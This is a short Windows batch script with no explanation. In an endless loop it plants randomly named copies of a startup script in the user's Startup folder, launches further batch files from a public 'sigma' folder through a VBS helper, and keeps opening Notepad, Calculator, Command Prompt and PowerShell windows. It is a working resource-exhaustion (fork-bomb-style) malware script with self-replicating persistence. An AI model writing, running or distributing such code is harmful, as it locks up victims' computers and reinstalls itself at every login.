@echo off
:loop
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\d%random%d.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
start notepad
start calc
start cmd
start powershell
goto loop
